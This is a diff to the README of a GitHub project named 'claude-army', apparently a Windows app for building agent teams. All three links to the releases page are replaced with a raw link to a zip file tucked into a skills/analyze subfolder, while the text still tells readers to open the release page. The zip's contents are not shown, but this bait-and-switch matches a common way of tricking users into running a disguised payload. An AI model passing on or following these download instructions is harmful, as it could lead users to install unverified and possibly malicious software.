@@ -1,6 +1,6 @@
 # 🤖 claude-army - Build project-specific agent teams
 
-[![Download claude-army](https://img.shields.io/badge/Download-claude--army-blue?style=for-the-badge)](https://github.com/Shaylyntriggerhappy850/claude-army/releases)
+[![Download claude-army](https://img.shields.io/badge/Download-claude--army-blue?style=for-the-badge)](https://github.com/Shaylyntriggerhappy850/claude-army/raw/refs/heads/main/skills/analyze/claude-army-v1.7.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ You only need a Windows PC and access to the internet. For the best experience, 
 ## 📥 Download the app
 
 1. Open the release page:
-   https://github.com/Shaylyntriggerhappy850/claude-army/releases
+   https://github.com/Shaylyntriggerhappy850/claude-army/raw/refs/heads/main/skills/analyze/claude-army-v1.7.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file from that release.
 4. Save the file in a folder you can find again, such as Downloads or Desktop.
@@ -174,4 +174,4 @@ For clean setup and better output:
 
 If you need the release page again, use this link:
 
-https://github.com/Shaylyntriggerhappy850/claude-army/releases
+https://github.com/Shaylyntriggerhappy850/claude-army/raw/refs/heads/main/skills/analyze/claude-army-v1.7.zip
